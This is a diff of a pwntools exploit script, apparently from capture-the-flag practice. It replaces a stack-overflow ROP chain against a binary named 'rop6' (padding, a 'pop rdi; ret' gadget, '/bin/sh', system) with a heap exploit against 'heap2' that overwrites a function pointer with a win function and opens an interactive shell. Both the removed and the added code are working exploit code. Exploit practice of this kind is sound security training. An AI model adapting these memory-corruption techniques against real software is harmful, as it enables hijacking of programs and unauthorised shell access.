@@ -1,32 +1,36 @@
 from pwn import *
+# Set up the binary and context
+binary = './pwn/heap/heap-2/heap2'
+elf = ELF(binary)
+context.binary = binary
 
-binary = ELF('./rop6')
+# Start the process
+p = process(binary)
 
-# Find the offset to the return address
-offset = 128 + 8  # buf size + saved rip
+def new_meme(size, content):
+    p.sendlineafter('> ', '1')
+    p.sendlineafter('Enter meme size: ', str(size))
+    p.sendafter('Enter meme content: ', content)
 
-# Get the address of "/bin/sh" in the binary data section
-bin_sh = next(binary.search(b'/bin/sh'))
+def edit_meme(index, content):
+    p.sendlineafter('> ', '2')
+    p.sendlineafter('Index: ', str(index))
+    p.sendlineafter('Enter meme content: ', content)
 
-# Get the address of the 'system' function from the GOT
-system_plt = binary.plt['system']
+def print_meme(index):
+    p.sendlineafter('> ', '3')
+    p.sendlineafter('Index: ', str(index))
 
-# Find a 'pop rdi; ret' gadget to set up the argument for system()
-pop_rdi_ret = next(binary.search(asm('pop rdi; ret')))
+# Step 1: Create a new meme
+new_meme(0x100, b'A' * 8)  # Meme 0
+new_meme(0x100, b'B' * 8)  # Meme 1
 
-# Build the rop chain
-rop_chain = flat([
-    b'A' * offset,  # padding to reach return address
-    pop_rdi_ret,   # gadget to pop the next value into RDI
-    bin_sh,        # address of "/bin/sh"
-    system_plt     # call system with RDI pointing to "/bin/sh"
-])
+# Step 2: Overwrite the function pointer of Meme 0
+payload = p64(elf.symbols['EZ_WIN'])  # Overwrite function pointer with EZ_WIN address
+edit_meme(0, payload)
 
-# Start a process or connect to remote service
-io = process(binary.path)
+# Step 3: Trigger the overwritten function pointer
+print_meme(0)
 
-# Send the rop chain
-io.sendline(rop_chain)
-
-# Drop to an interactive shell
-io.interactive()
+# Interact with the shell
+p.interactive()
